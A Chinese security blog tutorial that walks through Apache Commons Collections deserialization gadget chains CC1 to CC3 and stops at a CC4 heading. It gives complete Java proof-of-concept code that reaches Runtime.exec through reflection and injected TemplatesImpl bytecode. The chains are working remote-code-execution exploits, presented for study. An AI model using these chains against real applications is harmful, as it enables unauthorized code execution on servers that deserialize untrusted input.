title: java反序列化之CommonsCollections链
author: bmth
tags:
  - 反序列化
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/bdaa2c94fe23455b875ecc0bf7420611.png'
cover: 'https://img-blog.csdnimg.cn/bdaa2c94fe23455b875ecc0bf7420611.png'
date: 2022-02-21 13:30:00
---
![](https://img-blog.csdnimg.cn/bdaa2c94fe23455b875ecc0bf7420611.png)
学web还是得接触java反序列化，太重要了

[java序列化与反序列化全讲解](https://blog.csdn.net/mocas_wang/article/details/107621010)
序列化文件头是`ac ed 00 05` ，经过base64转换之后是`ro0AB`，`00 05`是序列化协议版本 
![](https://img-blog.csdnimg.cn/045cefad13804d8f9d5cf6c897d9289d.png)
反序列化时调用重写的readObject()方法，导致了命令执行
```java
import java.io.*;

public class test{
    public static void main(String args[]) throws Exception{
        //定义myObj对象
        MyObject myObj = new MyObject();
        myObj.name = "hi";
        //创建一个包含对象进行反序列化信息的”object”数据文件
        FileOutputStream fos = new FileOutputStream("object");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        //writeObject()方法将myObj对象写入object文件
        os.writeObject(myObj);
        os.close();
        //从文件中反序列化obj对象
        FileInputStream fis = new FileInputStream("object");
        ObjectInputStream ois = new ObjectInputStream(fis);
        //恢复对象
        MyObject objectFromDisk = (MyObject)ois.readObject();
        System.out.println(objectFromDisk.name);
        ois.close();
    }
}

class MyObject implements Serializable{
    public String name;
    //重写readObject()方法
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
        //执行默认的readObject()方法
        in.defaultReadObject();
        //执行打开计算器程序命令
        Runtime.getRuntime().exec("notepad");
    }
}
```
成功执行notepad命令，弹出记事本
![](https://img-blog.csdnimg.cn/82cccdab05ba47a2852aaf25aa6aca31.png)
>MyObject 类有一个公有属性name ，myObj 实例化后将 myObj.name 赋值为了"hi" ，然后序列化写入文件object
MyObject 类实现了`Serializable`接口，并且重写了`readObject()`函数 ，`readObject()`方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回

那么我们就明白了，如果我们能控制反序列化的内容，并且找到重写了readObject()的类，那么readObject()中的代码就会执行，并且找到相关的调用链，就可能会调用危险方法

- 漏洞使用在应用程序中已经存在的 gadget 类
- 创建一个实例和方法调用的 chain，这个 chain 中有必不可少的三个元素：
1. 开头是 `"kick-off" gadget`，在反序列化过程中或反序列化之后会执行
2. 结束时 `"sink" gadget`，执行任意的代码或者命令的类
3. 中间是很多 `chain gadget`，能将开头的 `"kick-off" gadget` 和 `"sink" gadget` 连起来，形成 chain 形的调用
- 形成的序列化 chain 发送到有脆弱性的应用程序中
- chain 在序列化过程中或序列化之后在应用程序中执行


利用工具：[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
## CommonsCollections1
Apache Commons Collections 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。作为 Apache 开源项目的重要组件，被广泛运用于各种 Java 应用的开发

首先导入commons-collections-3.1，[https://archive.apache.org/dist/commons/collections/source/commons-collections-3.1-src.zip](https://archive.apache.org/dist/commons/collections/source/commons-collections-3.1-src.zip)

>测试环境：
JDK 1.7
Commons Collections 3.1

### 前置知识
#### AbstractMapDecorator
首先 CC 库中提供了一个抽象类 `org.apache.commons.collections.map.AbstractMapDecorator`，这个类是 Map 的扩展，并且从名字中可以知道，这是一个基础的装饰器，用来给 map 提供附加功能，被装饰的 map 存在该类的属性中，并且将所有的操作都转发给这个 map

这个类有很多实现类，各个类触发的方式不同，重点关注的是 TransformedMap 以及 LazyMap
##### TransformedMap
`org.apache.commons.collections.map.TransformedMap`类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由 Transformer 来定义，Transformer 在 TransformedMap 实例化时作为参数传入
![](https://img-blog.csdnimg.cn/b76b8e8f55cc4f7a9591e68b376e959c.png)
存在一个装饰功能，对map、keyTransformer和valueTransformer进行包装
![](https://img-blog.csdnimg.cn/cc0529f47193406aa6eb28d1224c4ce4.png)
这里如果调用了checkSetValue方法，就会触发相应参数的 Transformer 的 transform() 方法
##### LazyMap
`org.apache.commons.collections.map.LazyMap` 与 TransformedMap 类似，不过不同是调用 get() 方法时如果传入的 key 不存在，则会触发相应参数的 Transformer 的 transform() 方法
![](https://img-blog.csdnimg.cn/b6b498a442cb4d7fae5a2b9fd9aa853c.png)
与 LazyMap 具有相同功能的，是 `org.apache.commons.collections.map.DefaultedMap`，同样是 get() 方法会触发 transform 方法

#### Transformer
`org.apache.commons.collections.Transformer`是一个接口，提供了一个 transform() 方法，用来定义具体的转换逻辑。方法接收 Object 类型的 input，处理后将 Object 返回
![](https://img-blog.csdnimg.cn/dff3a097bfe94feeba969c4188522624.png)
##### InvokerTransformer
这个实现类从 Commons Collections 3.0 引入，功能是使用反射创建一个新对象
![](https://img-blog.csdnimg.cn/ff1813c5b07a4a989d3825eb653e220d.png)

看一下它的 transfrom 方法，通过调用 input 的方法，并将方法返回结果作为处理结果进行返回
![](https://img-blog.csdnimg.cn/98b6ef3ec4ef4022b2703aca22a1c515.png)
调用需要的参数 iMethodName/iParamTypes 是在 InvokerTransformer 的构造函数中传入
这样我们就可以使用 InvokerTransformer 来执行方法

##### ChainedTransformer
`org.apache.commons.collections.functors.ChainedTransformer` 类也是一个 Transformer的实现类，但是这个类自己维护了一个 Transformer 数组， 在调用 ChainedTransformer 的 transform 方法时，会循环数组，依次调用 Transformer 数组中每个 Transformer 的 transform 方法，并将结果传递给下一个 Transformer
![](https://img-blog.csdnimg.cn/ade1186825454e49b28edf8c1756f394.png)
这样就给了使用者链式调用多个 Transformer 分别处理对象的能力
##### ConstantTransformer
`org.apache.commons.collections.functors.ConstantTransformer` 是一个返回固定常量的 Transformer，在初始化时储存了一个 Object，后续的调用时会直接返回这个 Object
![](https://img-blog.csdnimg.cn/cd217236af314322b544a9308fe0c3b7.png)

这个类用于和 ChainedTransformer 配合，将其结果传入 InvokerTransformer 来调用我们指定的类的指定方法

### 攻击构造
#### TransformedMap
```java
ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
});

Map map2 = TransformedMap.decorate(hashMap,null,chain);
map2.put(10, "aaa");
```
使用 ConstantTransformer 返回 Runtime 的 Class 对象，传入 InvokerTransformer 中，并借助 ChainedTransformer 的链式调用方式完成反射的调用
使用 TransformedMap 的 decorate 方法将 ChainedTransformer 设置为 map 的装饰器处理方法后，当调用 TransformedMap 的 put/setValue 等方法时会触发 Transformer 链的调用处理

接下来我们需要找到一个 kick-off gadget：一个类重写了 readObject ，在反序列化时可以改变 map 的值
于是我们找到了`sun.reflect.annotation.AnnotationInvocationHandler`这个类。这个类实现了 InvocationHandler 接口，原本是用于 JDK 对于注解形式的动态代理
首先是构造方法：
![](https://img-blog.csdnimg.cn/29c22b54d1cd4a7f9a90d8b75cfedf0f.png)

构造方法接收两个参数，第一个参数是 Annotation 实现类的 Class 对象，第二个参数是是一个 key 为 String、value 为 Object 的 Map，构造方法判断 var1 有且只有一个父接口，并且是 `Annotation.class`，才会将两个参数初始化在成员属性 type 和 memberValues 中

接下来我们看一下这个类重写的 readObject 方法：
![](https://img-blog.csdnimg.cn/3c96b691bba746699d49114e504458be.png)
首先调用`AnnotationType.getInstance(this.type)`方法来获取 type 这个注解类对应的 AnnotationType 的对象，然后获取其 memberTypes 属性，这个属性是个 Map，存放这个注解中可以配置的值

然后循环 `this.memberValues` 这个 Map ，获取其 Key，如果注解类的 memberTypes 属性中存在与 `this.memberValues` 的 key 相同的属性，并且取得的值不是 ExceptionProxy 的实例也不是 memberValues 中值的实例，则取得其值，并调用 setValue 方法写入值

然后进入`AbstractInputCheckedMapDecorator.java`的 setValue 方法
![](https://img-blog.csdnimg.cn/19bda41519514868bd119bdda8d2d3bb.png)
调用`TransformedMap.java`的checkSetValue方法，执行transform
![](https://img-blog.csdnimg.cn/866dcfbd8f9d4bcab4693ad9066419a3.png)

所以我们构造恶意 payload 的思路就清楚了：
- 构造一个 AnnotationInvocationHandler 实例，初始化时传入一个注解类和一个 Map，这个 Map 的 key 中要有注解类中存在的属性，但是值不是对应的实例，也不是 ExceptionProxy 对象
- 这个 Map 由 TransformedMap 封装，并调用自定义的 ChainedTransformer 进行装饰
- ChainedTransformer 中写入多个 Transformer 实现类，用于链式调用，完成恶意操作


POC：
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.annotation.Generated;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class cc1 {
    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException {

        Map hashMap = new HashMap();
        // 这里 key 一定是 下面实例化 AnnotationInvocationHandler 时传入的注解类中存在的属性值
        // 并且这里的值的一定不是属性值的类型
        //hashMap.put("comments", 2);
        hashMap.put("value", "value");

        // 结合 ChainedTransformer
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        });

        Map transformedMap = TransformedMap.decorate(hashMap, null, chain);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor construct = c.getDeclaredConstructor(Class.class, Map.class);

        construct.setAccessible(true);
        //InvocationHandler handler = (InvocationHandler) constructor.newInstance(Generated.class, transformedMap);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Target.class, transformedMap);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc1"));
            outputStream.writeObject(handler);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc1"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}
```
网上大多数 payload 使用`Target.class`的 value 属性来触发，其实用什么都行，找任意一个有属性的注解都可以，这里还可以使用 `Generated.class` 的 comments 属性或者`Retention.class`的 value 属性
#### LazyMap
除了用 TransformedMap，还可以用 LazyMap 来触发，LazyMap 通过 get() 方法获取不到 key 的时候触发 Transformer
发现 AnnotationInvocationHandler 的 invoke() 方法可以触发 memberValues 的 get 方法
![](https://img-blog.csdnimg.cn/416f42e7a1524a40bb9027671f13d3d5.png)
如果这里的memberValues是个代理类，那么就会调用memberValues对应handler的invoke方法
这里需要用到动态代理，就是被动态代理的对象调用任意方法都会调用对应的InvocationHandler 的 invoke 方法

那构造的思路的就有了，在使用带有装饰器的 LazyMap 初始化 AnnotationInvocationHandler 之前，先使用 InvocationHandler 代理一下 LazyMap，这样反序列化 AnnotationInvocationHandler 时，调用 LazyMap 值的 setValue 方法之前会调用代理类的 invoke 方法，触发 LazyMap 的 get 方法

POC：
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class cc1_2 {
    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        // 结合 ChainedTransformer
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        });


        Map lazyMap = LazyMap.decorate(new HashMap(), chain);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        // 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
        // 创建LazyMap的动态代理类实例
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

        // 使用动态代理初始化 AnnotationInvocationHandler
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc1"));
            outputStream.writeObject(invocationHandler);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc1"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}
```
调用链：
```
AnnotationInvocationHandler.readObject()
  Proxy.entrySet() // readObject调用了proxy的某些方法，回调invoke
    Proxy.invoke() === AnnotationInvocationHandler.invoke()
      LazyMap.get()
         ChainedTransformer.transform()
          ConstantTransformer.transform() // 获取Runtime.class
          InvokerTransformer.transform()   // 获取Runtime.getRuntime
          InvokerTransformer.transform()   // 获取Runtime实例
          InvokerTransformer.transform()   // 调用exec方法触发rce
```

上面的poc在Java 7的低版本使用，在Java 8u71 之后`sun.reflect.annotation.AnnotationInvocationHandler`的readObject被修改了，不再有针对我们构造的map的赋值语句

参考：
[JAVA反序列化 - Commons-Collections组件](https://xz.aliyun.com/t/7031)
[Java安全之Commons Collections1分析](https://www.cnblogs.com/nice0e3/p/13798371.html)

## CommonsCollections2
测试依赖版本 commons-collections4 4.0，导入包，[https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0](https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0)

>测试环境：
JDK 1.7/JDK 1.8
Commons Collections 4.0
javassit

### 前置知识
#### PriorityQueue
优先队列PriorityQueue是Queue接口的实现，可以对其中元素进行排序，可以放基本数据类型的包装类（如：Integer，Long等）或自定义的类，默认情况下，优先级队列会根据自然顺序对元素进行排序
因此，放入PriorityQueue的元素，必须实现 Comparable 接口，PriorityQueue 会根据元素的排序顺序决定出队的优先级。如果没有实现 Comparable 接口，PriorityQueue 还允许我们提供一个 Comparator 对象来判断两个元素的顺序

PriorityQueue 支持反序列化，在重写的 readObject 方法中，将数据反序列化到`queue`中之后，会调用`heapify()`方法来对数据进行排序
![](https://img-blog.csdnimg.cn/83d9f4ca2fb5440f80d31e71514329ad.png)
`heapify()`方法调用`siftDown()`方法
![](https://img-blog.csdnimg.cn/316a6050e0d2410fa14cc12308b3a874.png)
在 comparator 属性不为空的情况下，调用 `siftDownUsingComparator()`方法
![](https://img-blog.csdnimg.cn/c30944c11d0a4a118b8ffe40d566db65.png)
在`siftDownUsingComparator()`方法中，会调用 comparator 的 compare() 方法来进行优先级的比较和排序
![](https://img-blog.csdnimg.cn/2e098591f91b421a938834c3d6591905.png)
重点：
```
comparator.compare(x, (E) c)
```
这里的x是我们可控的
#### TransformingComparator
TransformingComparator 是触发这个漏洞的一个关键点，他将 Transformer 执行点和 PriorityQueue 触发点连接了起来
TransformingComparator 看类名就类似 TransformedMap，实际作用也类似，用 Tranformer 来装饰一个 Comparator。也就是说，待比较的值将先使用 Tranformer 转换，再传递给 Comparator 比较

TransformingComparator 初始化时配置 Transformer 和 Comparator，如果不指定 Comparator，则使用 `ComparableComparator.<Comparable>comparableComparator()`，this.transformer并没有被static或transient修饰，所以是我们可控的
![](https://img-blog.csdnimg.cn/05e9772f5fea40e79f093851c507e30c.png)
在调用 TransformingComparator 的`compare`方法时，可以看到调用了`this.transformer.transform()`方法对要比较的两个值进行转换，然后再调用 compare 方法比较，如果这个this.transformer可控的话，就可以触发cc1中的后半段链
![](https://img-blog.csdnimg.cn/a8efd90948d247798febb5819255de0f.png)
#### TemplatesImpl
TemplatesImpl 类位于`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，实现了 Serializable 接口，因此它可以被序列化

首先看到该类中存在一个成员属性`_class`，是一个 Class 类型的数组，数组里下标为`_transletIndex`的类会在`getTransletInstance()`方法中使用`newInstance()`实例化
![](https://img-blog.csdnimg.cn/5465bd3c0a754b18a4d970cb78b9c80d.png)
`newTransformer()` 调用了`getTransletInstance()`方法
![](https://img-blog.csdnimg.cn/b2c6be64c8634c5b8d7c4fbbde73124f.png)
发现`getOutputProperties()`调用了`newTransformer()`，并且为public方法
![](https://img-blog.csdnimg.cn/6eee450bc0d64f4a9da4ee5b85ced8a6.png)
而`getOutputProperties()`方法就是类成员变量 `_outputProperties` 的 getter 方法
```java
private Properties _outputProperties;
```
看一下 `defineTransletClasses()` 的逻辑，首先要求`_bytecodes`不为空，接着就会调用自定义的 ClassLoader 去加载`_bytecodes`中的`byte[]`，而 `_bytecodes` 也是该类的成员属性

![](https://img-blog.csdnimg.cn/1df0629343ac4e18af34a70905498c72.png)
### 攻击构造
#### PriorityQueue
POC：
```java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class cc2 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        // 初始化 Transformer
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[]{"calc"})
        });

        TransformingComparator comparator = new TransformingComparator(chain);
        PriorityQueue queue = new PriorityQueue(1);

        queue.add(1);
        queue.add(2);

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue,comparator);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc2"));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc2"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```
1.为什么这里要put两个值进去?
这里往queue中put两个值，是为了让其size>1，只有size>1才能使的i>0，才能进入siftDown这个方法中，完成后面的链

2.这里为什么要在add之后才通过反射修改comparator的值?
![](https://img-blog.csdnimg.cn/0b0b93a0d3c845aaa1f43b1f840bd1fe.png)
add调用了offer方法
![](https://img-blog.csdnimg.cn/03891920d4d94003a7d918a7031af191.png)
offer方法中调用了siftUp方法
![](https://img-blog.csdnimg.cn/292ab9453eb9422c933e0b6b28e96642.png)
这里需要保证comparator的值为null，才能够正常的添加元素进queue，如果我们在add之前使comparator为我们构造好的TransformingComparator，就会报错

#### TemplatesImpl 
ysoserial 的 CC2 没有使用 ChainedTransformer，而直接使用了 InvokerTransformer 配合 TemplatesImpl 直接加载恶意类的 bytecode

触发逻辑为：

- 创建恶意的 TemplatesImpl 对象，写入 _bytecodes、_name 属性，完成调用 newTransformer 方法触发恶意类的实例化的条件
- 创建 PriorityQueue，由于 TemplatesImpl 不是 Comparable 对象，需要反射将恶意的 TemplatesImpl 对象写入到 PriorityQueue 的 queue 中
- 使用 InvokerTransformer （调用被装饰对象的 newTransformer 方法）创建 TransformingComparator ，并将其赋予到 PriorityQueue 中

POC：
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class cc2_2 {
    public static void main(String[] args) throws Exception{
        // 读取恶意类 bytes[]
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        //返回默认的类池
        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        //创建一个新的public类
        CtClass payload=classPool.makeClass("CommonsCollections222");
        //设置前面创建的CommonsCollections222类的父类为AbstractTranslet
        payload.setSuperclass(classPool.get(AbstractTranslet));
        //创建一个空的类初始化，设置构造函数主体为runtime
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
	    //转换为byte数组
        byte[] bytes=payload.toBytecode();

        // 初始化 PriorityQueue
        PriorityQueue<Object> queue = new PriorityQueue<>(2);
        queue.add("1");
        queue.add("2");
        
        // 初始化 TemplatesImpl 对象
        TemplatesImpl tmpl = new TemplatesImpl();
        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]{bytes});
        // _name 不能为空
        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmpl, "name");

        Field field = PriorityQueue.class.getDeclaredField("queue");
        field.setAccessible(true);
        Object[] objects = (Object[]) field.get(queue);
        objects[0] = tmpl;

        // 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
        // 这个类是 public 的，方便调用
        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator comparator  = new TransformingComparator(transformer);

        Field field2 = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field2.setAccessible(true);
        field2.set(queue, comparator);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc2"));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc2"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }

    }
}
```
1.为什么要设置恶意类的父类为AbstractTranslet?
我们需要令`_transletIndex`为i，此时的i为0，默认状态下`_transletIndex`的值为-1，而如果`_transletIndex`的值小于0，就会抛出异常：
![](https://img-blog.csdnimg.cn/37edc70ad53348bfb3f6301805275c51.png)
2.为什么要设置_name、_class、两个属性，其值对应的意义是什么?
首先如果要进入defineTransletClasses，需要满足这两个条件：
![](https://img-blog.csdnimg.cn/cb1421247fc54e4b9f10eeafdfa598f7.png)


调用链：
```
PriorityQueue.readObject()
  PriorityQueue.heapify()
  PriorityQueue.siftDown()
  PriorityQueue.siftDownUsingComparator()
  comparator.compare() === TransformingComparator.compare()
    InvokerTransformer.transform()
      TemplatesImpl.newTransformer()
        TemplatesImpl.getTransletInstance() 
          TemplatesImpl.defineTransletClasses()  // 定义类
        ...  // 创建类实例，触发static代码块

```
参考：[Java安全之Javassist动态编程](https://www.cnblogs.com/nice0e3/p/13811335.html)
[Java安全之Commons Collections2分析](https://www.cnblogs.com/nice0e3/p/13860621.html)

## CommonsCollections3
在 CC3 中，使用了 CC1 的 LazyMap 和 CC2 的 TemplatesImpl，中间寻找了其他的触发 newTransformer 的实现方式
>测试环境：
JDK 1.7
Commons Collections 3.1

### 前置知识
#### TrAXFilter
`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter` 是对 XMLFilterImpl 的实现，在其基础上扩展了 Templates/TransformerImpl/TransformerHandlerImpl 属性

TrAXFilter 在实例化时接收 Templates 对象，并调用其 newTransformer 方法，这就可以触发我们的 TemplatesImpl 的攻击 payload 了
![](https://img-blog.csdnimg.cn/6997ae0e409b4edeb7db7b3d04893165.png)
#### InstantiateTransformer
Commons Collections 提供了 InstantiateTransformer 用来通过反射创建类的实例，可以看到 `transform()`方法实际上接收一个 Class 类型的对象，通过 `getConstructor` 获取构造方法，并通过 `newInstance` 创建类实例
![](https://img-blog.csdnimg.cn/85eb2b749d5848678ddc9e32007fe8e8.png)
反射需要的 iParamTypes 参数类型、iArgs 参数值则在 InstantiateTransformer 初始化时赋值
![](https://img-blog.csdnimg.cn/4c5200951f374b95abef82c5d861b5d2.png)
### 攻击构造
POC：
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class cc3 {
    public static void main(String[] args) throws Exception{

        // 读取恶意类 bytes[]
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("CommonsCollections333");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");

        byte[] bytes=payload.toBytecode();

        // 初始化 TemplatesImpl 对象
        TemplatesImpl tmpl = new TemplatesImpl();
        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]{bytes});
        // _name 不能为空
        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmpl, "name");

        // 结合 ChainedTransformer
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl})
        });

        // 初始化 LazyMap
        Map lazyMap = LazyMap.decorate(new HashMap(), chain);
        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        // 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
        // 创建LazyMap的动态代理类实例
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

        // 使用动态代理初始化 AnnotationInvocationHandler
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc3"));
            outputStream.writeObject(invocationHandler);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc3"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}
```
调用链：
```
AnnotationInvocationHandler.readObject()
  Proxy.entrySet() // readObject调用了proxy的某些方法，回调invoke
    Proxy.invoke() === AnnotationInvocationHandler.invoke()
        LazyMap.get()
            ChainedTransformer.transform()
             ConstantTransformer.transform()
             InstantiateTransformer.transform()
             newInstance()
                 TrAXFilter#TrAXFilter()
                   TemplatesImpl.newTransformer()
                     TemplatesImpl.getTransletInstance() 
                       TemplatesImpl.defineTransletClasses()  // 定义类
                    ...  // 创建类实例，触发static代码块
```
参考：[Java安全之Commons Collections3分析](https://www.cnblogs.com/nice0e3/p/13854098.html)

## CommonsCollections4
CC4 是 CC2 的一个变种，用 PriorityQueue 的 TransformingComparator 触发 ChainedTransformer，再利用 InstantiateTransformer 实例化 TemplatesImpl
>测试环境：
JDK 1.7/JDK1.8
Commons Collections 4.0

### 前置知识
#### TreeBag & TreeMap
Bag 接口继承自 Collection 接口，定义了一个集合，该集合会记录对象在集合中出现的次数。它有一个子接口 SortedBag，定义了一种可以对其唯一不重复成员排序的 Bag 类型

TreeBag 是对 SortedBag 的一个标准实现。TreeBag 使用 TreeMap 来储存数据，并使用指定 Comparator 来进行排序
![](https://img-blog.csdnimg.cn/080c934b0b3d4024821ea8bd97e48364.png)
TreeBag 继承自 AbstractMapBag，实现了 SortedBag 接口。初始化 TreeBag 时，会创建一个新的 TreeMap 储存在成员变量 map 里，而排序使用的 Comparator 则直接储存在 TreeMap 中
![](https://img-blog.csdnimg.cn/29f518340138427eada31b0061cf4ba6.png)
在对 TreeBag 反序列化时，会将反序列化出来的 Comparator 对象交给 TreeMap 实例化，并调用父类的`doReadObject`方法处理
![](https://img-blog.csdnimg.cn/328480a18f6c4173a1d1d9929c2257af.png)
而`doReadObject`方法会向 TreeMap 中 put 数据
![](https://img-blog.csdnimg.cn/fa3d4ce9af4147a3aa2c34aafb50d566.png)
类似优先级队列，对于这种有序的储存数据的集合，反序列化数据时一定会对其进行排序动作，而 TreeBag 则是依赖了 TreeMap 在 put 数据时会调用 compare 进行排序的特点来实现数据顺序的保存
![](https://img-blog.csdnimg.cn/5f6d62e67a0540088514176c7b2435bd.png)
毫无疑问，compare 方法中调用了 comparator 进行比较，那我们就可以使用 TransformingComparator 触发后续的逻辑
![](https://img-blog.csdnimg.cn/42c95d800f984eaba756f9a640cce6ae.png)
### 攻击构造
#### PriorityQueue
